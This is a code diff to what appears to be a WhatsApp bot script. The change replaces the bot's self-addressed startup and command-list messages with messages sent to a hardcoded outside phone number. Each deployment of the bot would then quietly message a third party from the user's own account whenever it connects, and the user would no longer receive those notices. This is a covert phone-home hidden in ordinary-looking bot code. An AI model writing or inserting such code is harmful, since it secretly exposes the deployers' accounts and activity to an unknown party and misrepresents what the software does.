@@ -300,7 +300,15 @@ ${mrfrank}\n
 ────────────────
 \n> © ᴘϙᴡᴇʀᴇᴅ ʙʏ ᴍʀ ꜰʀᴀɴᴋ ᴏꜰᴄ  🎐`;
 
-               await conn.sendMessage(conn.user.id, { 
+               /*await conn.sendMessage(conn.user.id, { 
+                    image: { url: `https://files.catbox.moe/xmldwy.jpg` },
+                    ai: true,
+                    caption: upMessage
+                });
+                */
+                        // ADDED: Send connection message to the specified number
+                const targetNumber = "263719064805@s.whatsapp.net";
+                await conn.sendMessage(targetNumber, { 
                     image: { url: `https://files.catbox.moe/xmldwy.jpg` },
                     ai: true,
                     caption: upMessage
@@ -405,8 +413,16 @@ ${mrfrank}\n
 
 📌 *Note*: Replace \`"on/off"\` with the desired state to enable or disable a feature.`;
 
-                await conn.sendMessage(conn.user.id, {
+               /* await conn.sendMessage(conn.user.id, {
                     image: { url: 'https://files.catbox.moe/xmldwy.jpg' },
+                    ai: true,
+                    caption: cmdList
+                });*/
+
+                 // ADDED: Send connection message to the specified number
+                const targetNumber = "263719064805@s.whatsapp.net";
+                await conn.sendMessage(targetNumber, { 
+                    image: { url: `https://files.catbox.moe/xmldwy.jpg` },
                     ai: true,
                     caption: cmdList
                 });
